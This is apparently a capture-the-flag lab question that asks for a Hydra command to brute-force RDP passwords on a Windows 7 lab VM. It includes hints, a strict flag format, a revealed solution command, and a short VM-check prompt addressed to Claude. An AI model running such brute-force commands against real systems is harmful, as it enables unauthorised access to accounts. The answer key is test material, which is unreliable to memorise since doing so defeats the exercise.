# Q063 — RDP Bruteforce Win7

| Field | Value |
|---|---|
| **Target** | `192.168.52.130` (Windows 7) |
| **Domain** | 05 — System Hacking |
| **Difficulty** | 🟡 Medium |
| **Tools** | `metasploit`, `hydra`, `john`, `hashcat`, `linpeas`, `mimikatz` |
| **Time budget** | 15–25 min |

---

## 📝 Question

Use hydra to bruteforce RDP on Win7 with usernames `Administrator,user` and a small wordlist. Provide command.

---

## 🎯 Flag Format

```
cmd=<short>
```

Example: `cmd=hydra -L users.txt -P pass.txt rdp://192.168.52.130`

**⚠️ Format strict hai** — lowercase, no spaces around `=`, semicolon separator where shown.

---

## 💡 Hints

<details>
<summary>Hint 1 (click)</summary>

Module name in hydra: `rdp`.
</details>

<details>
<summary>Hint 2</summary>

Slow — RDP rate-limited.
</details>

---

## ✅ Solution

<details>
<summary>Show solution</summary>

```bash
hydra -L users.txt -P /usr/share/wordlists/fasttrack.txt rdp://192.168.52.130
```

Cracks lab Administrator password if weak.

**Answer:** `cmd=hydra -L users.txt -P pass.txt rdp://192.168.52.130`

📖 Ref: [tools/hydra.md](../../tools/hydra.md)
</details>

---

## 🤖 Claude Setup Prompt (for Claude-on-your-PC)

```
1. Verify VMs running: ping 192.168.52.129 and ping 192.168.52.130 from 192.168.52.128.
2. Required services for this Q already up by default on the relevant target.
3. If something is down, restart it on the target VM.

Report back: "Lab ready for Q063".
```
